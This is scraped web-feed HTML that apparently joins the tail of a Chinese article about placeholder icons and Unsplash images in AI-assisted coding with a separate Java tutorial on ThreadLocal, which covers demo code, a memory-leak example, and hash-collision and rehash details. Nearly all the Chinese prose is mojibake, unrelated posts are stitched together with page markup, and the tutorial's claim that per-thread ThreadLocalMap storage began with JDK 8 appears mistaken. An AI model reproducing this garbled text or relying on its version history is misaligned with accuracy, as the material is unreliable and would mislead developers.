<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ccb53c2124c40dd9e16a1a7352eeabc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=JyQAvOR53F4p%2FR2FJH%2BudD7qPbE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2484141f57c642459253d2c1e5b046dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=UEFgISf1O3E9jVl6HNfAOkmty4s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-35"><strong>é™„å½•2 ï¼šå¸¸è§èµ„æºå ä½ â€” AI ä»å“ªé‡Œè·å–</strong></h2>
<p>æœ¬é™„å½•é¢å‘å‚ä¸ AI Coding çš„å„ä½ï¼Œè¯´æ˜å¸¸è§å ä½èµ„æºï¼ˆå›¾æ ‡ã€å›¾ç‰‡ï¼‰åº”ä»ä½•å¤„å–å¾—ï¼Œä»¥åŠå¦‚ä½•åœ¨æç¤ºè¯ä¸­æ˜ç¡®è¦æ±‚ï¼Œé¿å…å›¾è£‚æˆ–ç¼ºå›¾æ ‡ã€‚</p>
<h3 data-id="heading-36"><strong>1. å›¾æ ‡ (Icon) å ä½</strong></h3>
<p>å»ºè®®åšæ³•ï¼šåœ¨æç¤ºè¯ä¸­ç›´æ¥æŒ‡å®šä½¿ç”¨æŸä¸€å¥—å›¾æ ‡åº“ï¼Œè®© AI ç”¨ç°æˆç»„ä»¶è€Œéè‡ªç»˜æˆ–å ä½æ–‡å­—ã€‚</p>
<p>*Â å¯é€‰æ¥æºï¼ˆä»»é€‰å…¶ä¸€å³å¯ï¼Œåœ¨æç¤ºè¯é‡Œæä¸€å˜´å³å¯ï¼‰ï¼š</p>
<ul>
<li>
<p>React ç”Ÿæ€å¸¸ç”¨ï¼š<em><strong>react-icons</strong></em>ï¼ˆå¦‚ <em><strong>react-icons/fa</strong></em>ã€<em><strong>react-icons/hi</strong></em> ç­‰ï¼‰</p>
</li>
<li>
<p>ç»„ä»¶åº“è‡ªå¸¦ï¼šè‹¥é¡¹ç›®å·²ç”¨ Ant Designã€Material-UIã€Chakra UI ç­‰ï¼Œå¯å†™æ˜ã€Œä½¿ç”¨ Ant Design çš„ Icon ç»„ä»¶ã€ã€Œä½¿ç”¨ MUI çš„ Iconsã€ç­‰</p>
</li>
</ul>
<p>*Â æç¤ºè¯ç¤ºä¾‹ï¼š</p>
<ul>
<li>
<p>Â  ã€Œé¡µé¢é‡Œçš„å›¾æ ‡è¯·ç”¨ <em><strong>react-icons</strong></em>ï¼Œä»é‡Œé¢é€‰åˆé€‚çš„å›¾æ ‡å³å¯ã€‚ã€</p>
</li>
<li>
<p>Â  ã€Œæˆ‘ä»¬é¡¹ç›®ç”¨ Ant Designï¼Œå›¾æ ‡ç»Ÿä¸€ç”¨ Ant Design çš„ Icon ç»„ä»¶ã€‚ã€</p>
</li>
</ul>
<p>åªè¦åœ¨éœ€æ±‚æˆ–æç¤ºè¯ä¸­æ˜ç¡®å†™å‡ºã€Œç”¨ xx çš„ icon åº“ã€ï¼ŒAI å°±ä¼šä»è¯¥åº“é€‰å›¾æ ‡ï¼Œé¿å…ç•™ç©ºç™½æˆ–ä¹±ç å ä½ã€‚</p>
<h3 data-id="heading-37"><strong>2. å›¾ç‰‡ (Image) å ä½</strong></h3>
<p><strong>å»ºè®®åšæ³•</strong>ï¼šå ä½å›¾ç‰‡ä» <a href="https://link.juejin.cn?target=https%3A%2F%2Funsplash.com%2F" target="_blank" title="https://unsplash.com/" ref="nofollow noopener noreferrer">Unsplash</a> è·å–ä¸å†…å®¹ç›¸å…³çš„å…è´¹å¯å•†ç”¨å›¾ç‰‡ï¼›ä¸”<strong>å¿…é¡»åœ¨é‡‡ç”¨å‰éªŒè¯æ¯ä¸ªå›¾ç‰‡é“¾æ¥å¯è®¿é—®</strong>ï¼Œé¿å…ä¸Šçº¿åå›¾è£‚ã€‚</p>
<ul>
<li>Â  æ¥æºï¼š Unsplash æä¾›å¯å…è´¹ä½¿ç”¨çš„å›¾ç‰‡ï¼Œé€‚åˆåŸå‹ä¸å ä½ã€‚</li>
</ul>
<p>æç¤ºè¯ä¸­å»ºè®®å†™æ˜ï¼š</p>
<ul>
<li>
<p>Â  ã€Œå ä½å›¾ç‰‡ä» Unsplash ä¸Šè·å–ä¸ [ä¸»é¢˜/å…³é”®è¯] ç›¸å…³çš„å…¬å…±å›¾ç‰‡ã€‚ã€</p>
</li>
<li>
<p>Â  ã€Œä½¿ç”¨ Unsplash çš„å›¾ç‰‡ä½œä¸ºå ä½å›¾ï¼Œå¹¶åœ¨ä»£ç æˆ–è„šæœ¬ä¸­éªŒè¯æ¯ä¸ªå›¾ç‰‡ URL å¯è®¿é—®ï¼›è‹¥ä¸å¯è®¿é—®åˆ™æ›¿æ¢æˆ–è·³è¿‡ï¼Œé˜²æ­¢å›¾è£‚ã€‚ã€</p>
</li>
<li>
<p>Â  é‡è¦ï¼š åŠ¡å¿…è®© AI é€ä¸ªéªŒè¯ Unsplash çš„å›¾ç‰‡é“¾æ¥æ˜¯å¦å¯è®¿é—®ï¼ˆä¾‹å¦‚ç”¨ HEAD/GET è¯·æ±‚æˆ–ç®€å•çš„åŠ è½½æµ‹è¯•ï¼‰ï¼Œå†å†™è¿›é¡µé¢æˆ–èµ„æºåˆ—è¡¨ã€‚è¿™æ ·å¯ä»¥é¿å…æ‹¿å›æ¥çš„é“¾æ¥å·²å¤±æ•ˆå¯¼è‡´å‰åç«¯å‡ºç°å›¾è£‚ã€‚</p>
</li>
</ul>
<p><strong>å°ç»“ï¼š</strong> å›¾æ ‡æŒ‡å®š icon åº“ï¼›å›¾ç‰‡æŒ‡å®š Unsplash + éªŒè¯å¯è®¿é—®æ€§ï¼Œå³å¯åœ¨ AI Coding æµç¨‹ä¸­ç¨³å®šä½¿ç”¨è¿™ä¸¤ç±»å ä½èµ„æºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[threadlocal]]></title>    <link>https://juejin.cn/post/7604175912481652742</link>    <guid>https://juejin.cn/post/7604175912481652742</guid>    <pubDate>2026-02-09T07:59:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604175912481652742" data-draft-id="7604279756599197732" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="threadlocal"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-09T07:59:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç æå†œå¤«"/> <meta itemprop="url" content="https://juejin.cn/user/4126885865862187"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            threadlocal
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4126885865862187/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç æå†œå¤«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:59:48.000Z" title="Mon Feb 09 2026 07:59:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#" ref="nofollow noopener noreferrer">?</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23%25E6%2580%25BB%25E7%25BB%2593" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#%E6%80%BB%E7%BB%93" ref="nofollow noopener noreferrer">æ€»ç»“</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23%25E5%2586%2585%25E9%2583%25A8%25E7%25BB%2593%25E6%259E%2584" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#%E5%86%85%E9%83%A8%E7%BB%93%E6%9E%84" ref="nofollow noopener noreferrer">å†…éƒ¨ç»“æ„</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23demo" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#demo" ref="nofollow noopener noreferrer">demo</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23%25E5%2586%2585%25E5%25AD%2598%25E6%25B3%2584%25E9%259C%25B2" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2" ref="nofollow noopener noreferrer">å†…å­˜æ³„éœ²</a>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23%25E7%25BB%2593%25E6%259E%259C" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#%E7%BB%93%E6%9E%9C" ref="nofollow noopener noreferrer">ç»“æœ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23%25E5%258E%259F%25E5%259B%25A0" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#%E5%8E%9F%E5%9B%A0" ref="nofollow noopener noreferrer">åŸå› </a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23%25E8%25A7%25A3%25E5%2586%25B3%25E5%2586%2585%25E5%25AD%2598%25E6%25B3%2584%25E9%259C%25B2" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#%E8%A7%A3%E5%86%B3%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2" ref="nofollow noopener noreferrer">è§£å†³å†…å­˜æ³„éœ²</a></li>
</ul>
</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23threadlocal%25E4%25B8%258Esynchronized%25E7%259A%2584%25E5%258C%25BA%25E5%2588%25AB" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#threadlocal%E4%B8%8Esynchronized%E7%9A%84%E5%8C%BA%E5%88%AB" ref="nofollow noopener noreferrer">ThreadLocalä¸Synchronizedçš„åŒºåˆ«</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23jdk8%25E5%2589%258D%25E5%2590%258E%25E5%258C%25BA%25E5%2588%25AB" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#jdk8%E5%89%8D%E5%90%8E%E5%8C%BA%E5%88%AB" ref="nofollow noopener noreferrer">jdk8å‰ååŒºåˆ«</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23hash%25E5%2586%25B2%25E7%25AA%2581%25E5%25A6%2582%25E4%25BD%2595%25E8%25A7%25A3%25E5%2586%25B3" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#hash%E5%86%B2%E7%AA%81%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3" ref="nofollow noopener noreferrer">hashå†²çªå¦‚ä½•è§£å†³</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jysemel.top%2Finterview%2Fjava%2Fthread%2FThreadLocal.html%23%25E6%2589%25A9%25E5%25AE%25B9" target="_blank" title="https://www.jysemel.top/interview/java/thread/ThreadLocal.html#%E6%89%A9%E5%AE%B9" ref="nofollow noopener noreferrer">æ‰©å®¹</a></li>
</ul>
<h3 data-id="heading-0">?</h3>
<pre><code class="hljs">æ•´ä¸ªçº¿ç¨‹çš„å…¨å±€å˜é‡ï¼Œä¸æ˜¯ç¨‹åºçš„å…¨å±€å˜é‡
çº¿ç¨‹å†…éƒ¨çš„å±€éƒ¨å˜é‡ï¼Œä¸åŒçš„çº¿ç¨‹ä¹‹é—´ä¸ä¼šç›¸äº’å¹²æ‰°
</code></pre>
<h3 data-id="heading-1">æ€»ç»“</h3>
<ul>
<li>çº¿ç¨‹å¹¶å‘ï¼šåœ¨å¤šçº¿ç¨‹å¹¶å‘çš„åœºæ™¯ä¸‹</li>
<li>ä¼ é€’æ•°æ®ï¼šå¯ä»¥é€šè¿‡ThreadLocalåœ¨åŒä¸€ä¸ªçº¿ç¨‹ï¼Œä¸åŒç»„ä»¶ä¸­ä¼ é€’å…¬å…±å˜é‡</li>
<li>çº¿ç¨‹éš”ç¦»ï¼šæ¯ä¸ªçº¿ç¨‹çš„å˜é‡éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œä¸ä¼šäº’ç›¸å½±å“</li>
</ul>
<h3 data-id="heading-2">å†…éƒ¨ç»“æ„</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ad83062d999488a9d09dccd00b40547~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CN5p2Q5Yac5aSr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228789&amp;x-signature=9ylQpuzydxKlSDbQuY41o2dDLtk%3D" alt="Image text" loading="lazy"/></p>
<h3 data-id="heading-3">demo</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.jysemel.java.basic.thread.local;

<span class="hljs-keyword">import</span> java.util.UUID;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadLocalDemo</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;String&gt; threadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
                threadLocal.set(UUID.randomUUID() + <span class="hljs-string">"   T1"</span>);
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(TimeUnit.SECONDS.toMillis(<span class="hljs-number">5</span>));
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
                }
                System.out.println(<span class="hljs-string">"T1  "</span> + threadLocal.get());
            }
        }).start();

        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
                threadLocal.set(UUID.randomUUID() + <span class="hljs-string">"   T2"</span>);
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(TimeUnit.SECONDS.toMillis(<span class="hljs-number">5</span>));
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
                }
                System.out.println(<span class="hljs-string">"T2  "</span> + threadLocal.get());
            }
        }).start();
    }
}

</code></pre>
<h3 data-id="heading-4">å†…å­˜æ³„éœ²</h3>
<pre><code class="hljs language-ini" lang="ini">/**
 * å†…å­˜æ³„éœ²
 */
public class ThreadLocalDemo1 {

    private static final ThreadLocal&lt;byte <span class="hljs-section">[]</span>&gt; <span class="hljs-attr">threadLocal</span> = new ThreadLocal&lt;&gt;()<span class="hljs-comment">;</span>

    public static void main(String<span class="hljs-section">[]</span> args) {
        ExecutorService <span class="hljs-attr">executorService</span> = Executors.newCachedThreadPool()<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 100; i++) {</span>
            executorService.execute(() -&gt; {
                byte<span class="hljs-section">[]</span> <span class="hljs-attr">bytes</span> = new byte[<span class="hljs-number">10240</span>*<span class="hljs-number">20240</span>]<span class="hljs-comment">;</span>
                threadLocal.set(bytes)<span class="hljs-comment">;</span>
//                threadLocal.remove()<span class="hljs-comment">;</span>
            })<span class="hljs-comment">;</span>
        }
        executorService.shutdown()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h4 data-id="heading-5">ç»“æœ</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/581365b3c6b942648ae3638156331518~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CN5p2Q5Yac5aSr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228789&amp;x-signature=zMujbdTPtYfkWxwV84u2P90dxP4%3D" alt="Image text" loading="lazy"/></p>
<h4 data-id="heading-6">åŸå› </h4>
<pre><code class="hljs">1ã€ThreadLocalå¯¹è±¡å­˜å‚¨åœ¨ThreadLocalMapä¸­ï¼Œå½“çº¿ç¨‹ç»“æŸåï¼Œ
ThreadLocalMapå¯¹è±¡ä¸ä¼šè¢«å›æ”¶ï¼Œä¼šä¸€ç›´ä¿å­˜åœ¨Threadå¯¹è±¡ä¸­
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f61bdfbc856647b6af66795792fb603e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CN5p2Q5Yac5aSr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228789&amp;x-signature=qHZKYw%2FzH2Q3tvGpLj8YDrD2KYU%3D" alt="Image text" loading="lazy"/></p>
<h4 data-id="heading-7">è§£å†³å†…å­˜æ³„éœ²</h4>
<pre><code class="hljs language-ini" lang="ini">public class ThreadLocalDemo1 {

    private static final ThreadLocal&lt;byte <span class="hljs-section">[]</span>&gt; <span class="hljs-attr">threadLocal</span> = new ThreadLocal&lt;&gt;()<span class="hljs-comment">;</span>

    public static void main(String<span class="hljs-section">[]</span> args) {
        ExecutorService <span class="hljs-attr">executorService</span> = Executors.newCachedThreadPool()<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 100; i++) {</span>
            executorService.execute(() -&gt; {
                byte<span class="hljs-section">[]</span> <span class="hljs-attr">bytes</span> = new byte[<span class="hljs-number">10240</span>*<span class="hljs-number">20240</span>]<span class="hljs-comment">;</span>
                threadLocal.set(bytes)<span class="hljs-comment">;</span>
                threadLocal.remove()<span class="hljs-comment">;</span>
            })<span class="hljs-comment">;</span>
        }
        executorService.shutdown()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-8">ThreadLocalä¸Synchronizedçš„åŒºåˆ«</h3>
<ul>
<li>
<p>Synchronized</p>
<p>åŒæ­¥æœºåˆ¶åªæä¾›äº†ä¸€ä»½å˜é‡ï¼Œå…¶ä»–çº¿ç¨‹åªèƒ½ç­‰å¾…ï¼Œä¸èƒ½å¹¶å‘
å¤šä¸ªçº¿ç¨‹ä¹‹é—´è®¿é—®èµ„æºçš„åŒæ­¥</p>
</li>
<li>
<p>ThreadLocal</p>
<p>æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½æä¾›äº†ä¸€ä»½å˜é‡çš„å‰¯æœ¬ï¼Œä»è€Œå®ç°åŒæ—¶è®¿é—®è€Œç›¸ä¸å¹²æ‰°
å¤šçº¿ç¨‹ä¸­è®©æ¯ä¸ªçº¿ç¨‹ä¹‹é—´çš„æ•°æ®ç›¸äº’éš”ç¦»</p>
</li>
</ul>
<h3 data-id="heading-9">jdk8å‰ååŒºåˆ«</h3>
<ul>
<li>
<p>jdk8ä¹‹å‰</p>
<p>ThreadLocalMap ä½œä¸º ThreadLocal ç±»çš„ä¸€ä¸ªé™æ€å†…éƒ¨ç±»ï¼Œæ‰¿æ‹…ç€å­˜å‚¨çº¿ç¨‹å±€éƒ¨å˜é‡
åœ¨è¿™ç§è®¾è®¡æ¨¡å¼ä¸‹ï¼Œæ— è®ºä¸€ä¸ªè¿›ç¨‹ä¸­å­˜åœ¨å¤šå°‘ä¸ªä¸åŒçš„ ThreadLocal å®ä¾‹ï¼Œ
å®ƒä»¬éƒ½å…±äº«åŒä¸€ä¸ª ThreadLocalMap ç»“æ„</p>
</li>
<li>
<p>jdk8ä¹‹å</p>
<p>ä½¿å¾— ThreadLocalMap ä¸ä»…æ˜¯ ThreadLocal ç±»çš„é™æ€å†…éƒ¨ç±»ï¼Œ
åŒæ—¶ä¹Ÿæˆä¸ºäº† Thread ç±»çš„ä¸€ä¸ªæˆå‘˜å˜é‡ ã€‚
æ¯ä¸ªçº¿ç¨‹éƒ½æ‹¥æœ‰è‡ªå·±ç‹¬ç«‹çš„ä¸€ä¸ª ThreadLocalMap å®ä¾‹ï¼Œä»è€Œå®ç°äº†æ›´ç»†ç²’åº¦çš„æ•°æ®éš”ç¦»å’Œç®¡ç†</p>
<p>æºç ï¼š
public void set(T value) {
Thread t = Thread.currentThread();
ThreadLocalMap map = getMap(t);
if (map != null) {
map.set(this, value);
} else {
createMap(t, value);
}
}</p>
</li>
</ul>
<h3 data-id="heading-10">hashå†²çªå¦‚ä½•è§£å†³</h3>
<ul>
<li>å¼€æ”¾åœ°å€æ³•è§£å†³hashå†²çª</li>
<li>å½“å‰æ’å…¥çš„å…ƒç´ ä»å†²çªä½ç½®å¼€å§‹ä¾æ¬¡å¾€åéå†ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªç©ºé—²ä½ç½® <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9472edbb1d0b4f1c93ea5ab7546124c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CN5p2Q5Yac5aSr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228789&amp;x-signature=Aczh9nVH2K6NzWxbwN6AClv4ajA%3D" alt="Image text" loading="lazy"/></li>
</ul>
<h3 data-id="heading-11">æ‰©å®¹</h3>
<pre><code class="hljs language-scss" lang="scss">æºç ï¼š
        private void <span class="hljs-built_in">rehash</span>() {
            <span class="hljs-built_in">expungeStaleEntries</span>();

            <span class="hljs-comment">// Use lower threshold for doubling to avoid hysteresis</span>
            if (size &gt;= threshold - threshold / <span class="hljs-number">4</span>)
                <span class="hljs-attribute">resize</span>();
        }

</code></pre>
